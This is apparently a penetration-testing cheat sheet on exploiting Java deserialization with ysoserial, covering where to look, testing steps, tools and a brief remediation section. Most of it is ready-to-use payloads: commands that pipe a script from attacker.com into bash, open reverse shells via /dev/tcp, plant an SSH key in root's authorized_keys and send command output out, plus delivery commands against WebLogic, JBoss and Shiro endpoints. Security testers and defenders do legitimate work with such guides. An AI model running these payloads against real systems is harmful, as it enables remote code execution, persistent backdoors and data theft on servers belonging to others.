# Java Deserialization (ysoserial)

## Overview
Java deserialization vulnerabilities occur when applications deserialize untrusted, attacker-controlled data using Java's native `ObjectInputStream.readObject()` method. Java's serialization mechanism is designed to reconstruct complex object graphs from byte streams, but if the application's classpath contains "gadget chains" — sequences of classes whose `readObject()` methods chain together to execute arbitrary code — an attacker who can control serialized input can achieve Remote Code Execution. These vulnerabilities have been responsible for critical compromises of WebLogic, JBoss, Jenkins, Apache Commons Collections, and many other Java enterprise applications.

## How It Works
When Java deserializes an object, it calls `readObject()` on each class in the stream. If the classpath contains vulnerable libraries (Apache Commons Collections, Spring, Groovy, JRE classes), these `readObject()` methods can be chained into a "gadget chain" that ultimately calls `Runtime.exec()` or equivalent. The attacker crafts a malicious serialized payload using **ysoserial** — a tool that generates gadget chain payloads for known vulnerable libraries. The payload is then delivered in any field that the server deserializes: HTTP headers, POST bodies, cookies, RMI endpoints, JMX, and more.

Serialized Java objects are recognizable by the magic bytes `AC ED 00 05` (hex) or `rO0AB` (base64).

## Impact
- Remote Code Execution as the application server's OS user
- Full system compromise: file read/write, reverse shells, lateral movement
- Data exfiltration from the server and connected databases
- Ransomware deployment or persistent backdoors
- Privilege escalation via SUID binaries or sudo misconfigurations post-RCE

## Where to Look
- HTTP POST bodies containing base64-encoded data starting with `rO0A`
- Cookies with base64 values starting with `rO0A` or hex `ACED0005`
- Java RMI endpoints (port 1099)
- JMX endpoints (port 9999, 7000)
- Java Messaging Service (JMS) queues
- JNDI lookup endpoints (LDAP, RMI — Log4Shell pattern)
- Application-specific binary protocols
- File upload endpoints that accept `.ser` or binary files
- `Content-Type: application/x-java-serialized-object`
- WebLogic (T3 protocol), JBoss, Jenkins

## Testing Steps
1. Search HTTP traffic for base64 strings starting with `rO0A` or binary data starting with `\xac\xed`.
2. Identify the Java libraries in use (check error messages, server banners, `/WEB-INF/lib/` if accessible).
3. Generate a detection payload using ysoserial with `CommonsCollections` gadget and a DNS callback:
   ```bash
   java -jar ysoserial.jar CommonsCollections6 'nslookup YOUR.COLLABORATOR.DOMAIN' | base64 -w 0
   ```
4. Submit the payload in every field that appears to contain serialized data.
5. Monitor Burp Collaborator or interactsh for DNS lookups — confirms deserialization occurs.
6. If DNS fires, escalate to a reverse shell payload.
7. Test different gadget chains (see list below) — different chains work depending on classpath.
8. For RMI endpoints: use `ysoserial RMIRegistryExploit` or `rmg` (remote-method-guesser).
9. For JMX: use Metasploit `java_jmx_server` module.
10. For WebLogic: test T3 protocol with `ysoserial` WebLogic-specific payloads.

## Payloads / Techniques

Identify serialized data in requests:
```bash
# Decode base64 and check for magic bytes
echo "rO0ABXQABHRlc3Q=" | base64 -d | xxd | head
# Look for: ac ed 00 05

# Grep HTTP history for Java serialized objects
grep -rl 'rO0A' burp_export/
```

Generate ysoserial payloads:
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar

# List all gadget chains
java -jar ysoserial.jar --help

# DNS-based detection (CommonsCollections1)
java -jar ysoserial.jar CommonsCollections1 \
  'nslookup $(id).YOUR.COLLABORATOR.BURP' | \
  base64 -w 0

# Command execution — reverse shell
java -jar ysoserial.jar CommonsCollections6 \
  'curl https://attacker.com/shell.sh | bash' | \
  base64 -w 0

# Write SSH key
java -jar ysoserial.jar CommonsCollections6 \
  'mkdir -p /root/.ssh && echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys' | \
  base64 -w 0
```

Common gadget chains to try:
```bash
# Apache Commons Collections (ubiquitous in enterprise Java)
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections2 'id'
java -jar ysoserial.jar CommonsCollections3 'id'
java -jar ysoserial.jar CommonsCollections4 'id'
java -jar ysoserial.jar CommonsCollections5 'id'
java -jar ysoserial.jar CommonsCollections6 'id'
java -jar ysoserial.jar CommonsCollections7 'id'

# Spring Framework
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Spring2 'id'

# Groovy
java -jar ysoserial.jar Groovy1 'id'

# BeanShell
java -jar ysoserial.jar BeanShell1 'id'

# JRE classes only (works without extra libraries)
java -jar ysoserial.jar URLDNS 'http://YOUR.COLLABORATOR.DOMAIN/'
java -jar ysoserial.jar JRMPClient 'attacker.com:1337'

# WebLogic specific
java -jar ysoserial.jar WebLogic1 'id'

# Hibernate (common in Spring Boot)
java -jar ysoserial.jar Hibernate1 'id'
```

URLDNS gadget for blind detection (no gadget library needed):
```bash
# Works on any Java app — triggers DNS lookup, no classpath dependencies
java -jar ysoserial.jar URLDNS 'http://detector.your-collaborator.domain/' | \
  base64 -w 0
# Embed in base64-encoded cookie, POST body, or header
```

Send payload via curl:
```bash
# Generate and send in one command
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'curl https://attacker.com/$(id)' | base64 -w 0)

curl -X POST https://target.com/api/deserialize \
  -H 'Content-Type: application/octet-stream' \
  -d "$(echo $PAYLOAD | base64 -d)"

# Or as base64 in a header
curl -X GET https://target.com/vulnerable-endpoint \
  -H "Authorization: RememberMe=$PAYLOAD"
```

Apache Shiro deserialization (uses different encoding):
```bash
# Shiro uses its own base64+AES encrypted cookies
# Use ysoserial with shiro-exploit or shiro-attack tools
git clone https://github.com/SummerSec/ShiroAttack2
java -jar ShiroAttack2.jar
# Or:
python3 shiro_exploit.py -u https://target.com -p CommonsCollections4 -c 'id'
```

WebLogic T3 deserialization:
```bash
# Using weblogic-framework
java -jar weblogic-framework.jar \
  --ip target.com --port 7001 \
  --gadget CommonsCollections6 \
  --command 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

JBoss/WildFly deserialization:
```bash
# Using jexboss
python jexboss.py -host https://target.com

# Or manual with ysoserial
java -jar ysoserial.jar CommonsCollections1 \
  'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/payload.ser
# Send to JBoss HTTP invoker endpoint
curl -X POST https://target.com/invoker/JMXInvokerServlet \
  --data-binary @/tmp/payload.ser
```

## Burp Suite Tips
- Search **HTTP history** for `rO0A` in request/response bodies to find serialization points.
- Use the **Java Deserialization Scanner** Burp extension — it automates payload generation and callback detection.
- **Burp Collaborator** is essential — use it as the DNS/HTTP callback target for the URLDNS gadget.
- In **Intruder**, iterate through all gadget chains with Collaborator payloads to identify which chain fires.
- Use **Payload Processor** in Intruder to base64-encode payloads on the fly.
- The **GadgetProbe** Burp extension can identify which gadget chains are available on the target classpath.

## Tools
- ysoserial — https://github.com/frohoff/ysoserial — primary payload generator
- GadgetProbe — classpath enumeration: https://github.com/BishopFox/GadgetProbe
- Java Deserialization Scanner (Burp extension) — https://github.com/federicodotta/Java-Deserialization-Scanner
- jexboss — JBoss/WildFly exploit: https://github.com/joaomatosf/jexboss
- ShiroAttack2 — Apache Shiro exploit tool
- remote-method-guesser (rmg) — Java RMI security assessment
- Metasploit `java_deserialization` modules
- serialkiller — whitelist-based Java deserialization filter

## Remediation
- Avoid Java native serialization for untrusted data entirely — use JSON, Protocol Buffers, or XML with schema validation instead.
- Implement deserialization filters using `ObjectInputFilter` (Java 9+) or `ValidatingObjectInputStream` (Apache Commons IO):
  ```java
  ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!*;java.base/*;com.myapp.*"
  );
  ObjectInputStream ois = new ObjectInputStream(inputStream);
  ois.setObjectInputFilter(filter);
  ```
- Deploy SerialKiller or NotSoSerial as an agent to block dangerous deserialization gadget classes.
- Update vulnerable libraries: Apache Commons Collections, Spring, Groovy to patched versions.
- Use the `javaagent` approach: `-javaagent:serialkiller.jar` to enforce class whitelisting at JVM level.
- Implement cryptographic signing/HMAC of serialized data to detect tampering before deserialization.
- Monitor for `java.lang.Runtime.exec()` calls via application security monitoring (RASP).

## References
https://portswigger.net/web-security/deserialization
https://github.com/frohoff/ysoserial
https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://github.com/NickstaDB/SerializationDumper
